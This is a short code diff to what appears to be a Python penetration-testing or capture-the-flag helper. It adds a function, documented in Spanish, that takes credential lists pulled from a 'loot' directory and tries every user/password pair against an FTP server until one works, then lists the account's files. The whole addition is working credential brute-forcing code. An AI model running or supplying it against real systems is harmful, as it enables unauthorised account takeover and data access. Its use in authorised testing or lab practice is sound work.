@@ -228,6 +228,52 @@ def parse_credential_lists(loot_dir: str) -> tuple[list[str], list[str]]:
     return users, passwords
 
 
+def try_ftp_login(host: str, users: list[str], passwords: list[str],
+                  port: int = 21, timeout: int = 15, max_attempts: int = 300) -> dict[str, Any]:
+    """Prueba usuario/contraseña (autenticado) contra el FTP. Devuelve la 1ª válida.
+
+    Útil cuando has sacado listas de credenciales y quieres ver si abren una
+    cuenta FTP con más ficheros que el anónimo.
+    """
+    result: dict[str, Any] = {"success": False, "user": None, "password": None,
+                              "attempts": 0, "files": [], "error": None}
+    pairs = [(u.strip(), p.strip()) for u in (users or []) for p in (passwords or [])
+             if u.strip() and p.strip()]
+    if not pairs:
+        result["error"] = "Sin credenciales que probar."
+        return result
+
+    for user, pwd in pairs[:max_attempts]:
+        result["attempts"] += 1
+        ftp: Optional[ftplib.FTP] = None
+        try:
+            ftp = ftplib.FTP(timeout=timeout)
+            ftp.connect(host, port)
+            ftp.login(user, pwd)
+            result.update({"success": True, "user": user, "password": pwd})
+            try:
+                result["files"] = [n for n in ftp.nlst() if n not in (".", "..")]
+            except Exception:
+                pass
+            try:
+                ftp.quit()
+            except Exception:
+                pass
+            return result
+        except ftplib.error_perm:
+            pass  # credenciales incorrectas; siguiente
+        except (OSError, TimeoutError, ftplib.error_temp) as exc:
+            result["error"] = str(exc)
+            break
+        finally:
+            if ftp is not None:
+                try:
+                    ftp.close()
+                except Exception:
+                    pass
+    return result
+
+
 def _hashcat_hint(sample: str) -> str:
     s = sample
     if s.startswith("$6$"):
